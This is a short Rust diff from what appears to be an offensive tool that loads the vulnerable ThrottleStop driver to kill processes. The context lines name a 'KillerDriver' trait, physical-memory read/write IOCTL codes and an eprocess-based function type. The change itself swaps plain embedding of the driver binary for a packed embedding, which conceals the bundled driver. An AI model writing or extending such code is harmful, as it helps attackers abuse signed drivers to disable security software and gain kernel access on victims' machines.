@@ -5,6 +5,7 @@ use std::{
     os::windows::ffi::OsStrExt,
     ffi::{CStr, CString, OsStr}
 };
+use include_packed::include_packed;
 
 use winapi::{
     ctypes::c_void, 
@@ -45,7 +46,6 @@ const PHYS_READ: u32 = 0x80006498;
 const PHYS_WRITE: u32 = 0x8000649C;
 
 const DRIVER_DEVICE: &str = "\\\\.\\ThrottleStop";
-static DRIVER: &'static [u8] = include_bytes!("../../../drivers/ThrottleStop.sys");
 
 type NtAddAtomTerminateFn = unsafe extern "system" fn(
     eprocess: u64,
@@ -380,7 +380,7 @@ impl KillerDriver for ThrottleStop {
     }
 
     fn get_file(&self) -> Result<Vec<u8>, crate::utils::error::SigurdError> {
-        let v = DRIVER.to_vec();
+        let v = include_packed!("drivers/ThrottleStop.sys");
         return Ok(v);
     }
 
